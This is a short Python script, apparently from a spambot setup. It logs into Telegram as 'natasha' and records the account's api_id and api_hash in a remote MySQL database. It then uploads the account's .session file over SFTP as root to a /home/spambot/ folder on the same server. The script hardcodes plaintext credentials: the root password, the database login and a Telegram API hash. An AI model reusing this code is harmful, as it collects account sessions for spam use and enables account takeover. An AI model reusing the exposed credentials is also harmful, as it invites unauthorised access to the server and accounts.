from telethon import TelegramClient
import mysql.connector as con
import os
import paramiko
server = '185.233.38.219'
database = 'bulbulator'
username = 'spadmin'
password = 'admin123'
connection = con.connect(host=server,
                         database=database,
                         user=username,
                         password=password)

name = "natasha"
api_id = 19139494
api_hash="2404b1f3969035d69627060ef22c9b58"

client = TelegramClient(name, api_id, api_hash)
client.start()

cursor = connection.cursor()
cursor.execute("insert into people (api_id, api_hash, name) values (%s, %s, %s);",
               [api_id, api_hash, name])
connection.commit()
cursor.close()
connection.close()


t = paramiko.Transport(('185.233.38.219', 22))
t.connect(username="root",password="3zAJj8knV3H2")
sftp = paramiko.SFTPClient.from_transport(t)
localpath = name+'.session'
remotepath = '/home/spambot/'+name+'.session'
sftp.put(localpath, remotepath)
sftp.close()





